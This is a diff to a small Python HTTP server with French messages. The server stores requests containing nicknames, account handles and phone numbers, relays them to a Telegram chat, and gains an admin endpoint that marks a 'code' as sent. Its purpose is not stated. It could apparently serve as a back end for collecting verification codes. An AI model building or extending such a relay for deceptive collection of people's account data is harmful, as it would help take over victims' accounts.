@@ -15,7 +15,6 @@ TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")
 requests_db = {}
 history_log = []
 blocked_phones = set()
-blocked_users = set()
 
 
 def norm_phone(p):
@@ -23,14 +22,13 @@ def norm_phone(p):
 
 
 def load_data():
-    global requests_db, history_log, blocked_phones, blocked_users
+    global requests_db, history_log, blocked_phones
     try:
         with open(DATA_FILE, "r", encoding="utf-8") as f:
             d = json.load(f)
         requests_db = {k: v for k, v in d.get("requests", {}).items()}
         history_log = list(d.get("history", []))
         blocked_phones = set(d.get("blocked_phones", []))
-        blocked_users = set(d.get("blocked_users", []))
         print("[server] donnees chargees (%d demandes, %d bloques)" % (len(requests_db), len(blocked_phones)))
     except Exception:
         pass
@@ -43,7 +41,6 @@ def persist():
                 "requests": requests_db,
                 "history": history_log[-200:],
                 "blocked_phones": sorted(blocked_phones),
-                "blocked_users": sorted(blocked_users),
             }, f, ensure_ascii=False)
     except Exception as e:
         print("[server] echec sauvegarde: %s" % e)
@@ -92,13 +89,11 @@ def tg_notify_request(data, rid):
         "Pseudo : %s\n"
         "Compte : %s\n"
         "Numero : <code>%s</code>\n"
-        "Operateur : %s\n"
         "ID : <code>%s</code>"
     ) % (
         str(data.get("pseudo") or "-"),
         str(data.get("handle") or "-"),
         format_phone(data.get("phone")) or "-",
-        str(data.get("operator") or "-"),
         rid[:8].upper(),
     )
     tg_send(text)
@@ -218,6 +213,17 @@ class Server(SimpleHTTPRequestHandler):
             r["state"] = "done"
             r["by"] = "refuse"
             history_log.append({"action": "refuse", "data": r["data"], "ts": int(time.time() * 1000)})
+            persist()
+            return self._json({"ok": True})
+
+        if p.startswith("/api/admin/code/"):
+            rid = p.split("/")[-1]
+            r = requests_db.get(rid)
+            if not r:
+                return self._json({"ok": False, "error": "not_found"})
+            r["code_sent"] = True
+            r["code_sent_at"] = int(time.time() * 1000)
+            history_log.append({"action": "send", "data": r["data"], "ts": int(time.time() * 1000)})
             persist()
             return self._json({"ok": True})
 
